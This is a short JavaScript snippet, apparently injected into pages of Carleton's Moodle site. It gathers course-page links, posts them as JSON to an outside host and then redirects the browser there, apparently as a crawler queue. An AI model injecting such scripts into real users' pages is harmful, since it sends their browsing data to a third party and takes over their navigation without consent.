window.addEventListener('load', function(){
    console.log('injection start');
    var urls = [];
    for(var i = 0; i < document.links.length; i++) {
        var url = document.links[i].href;
        if (url.startsWith('https://moodle.carleton.edu/course/view.php?id=')) {
            urls.push(url);
        }
    }
    console.log('urls: ' + urls);
    var req = new XMLHttpRequest();
    req.addEventListener('load', function(){
        console.log(this.responseText);
        window.location = 'https://cia.gov/next';
    })
    req.open('POST', 'https://cia.gov/enqueue');
    req.send(JSON.stringify(urls));
});
